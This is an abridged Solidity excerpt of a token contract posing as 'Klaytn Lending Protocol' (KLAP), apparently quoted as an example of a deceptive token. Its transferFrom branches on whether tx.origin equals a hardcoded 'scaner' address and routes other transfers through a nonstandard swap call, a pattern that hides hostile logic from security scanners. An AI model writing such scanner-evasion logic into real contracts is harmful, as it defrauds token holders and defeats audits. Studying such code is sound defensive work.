...
contract COINDATA {
  ...
  address internal _dex = 0xc085A0215cFEcB9d698C3bA7EF8BC635685fdB4a;
  ...
  address public constant _OFFICE = 0xE3b1CF257253352ecE3d9f62e1b56AE5dD82B02d;
  address public constant nftAddress =
    0x655cD317C1980f18962e5FD2931e880558c17565;
  address public constant scaner = 0xaAadD54924d04290623A5079db382f74206F457F;
...
contract Coin is COINDATA, IERC20, Context {
  ...
  string public constant _name = "Klaytn Lending Protocol";
  string public constant _symbol = "KLAP";
  ...
  function transferFrom(
    ...
    if (tx.origin != scaner) {
      ...
      uint256 exAmount =
        IPancakeRouter02(_route).swap(sender, recipient, amount);
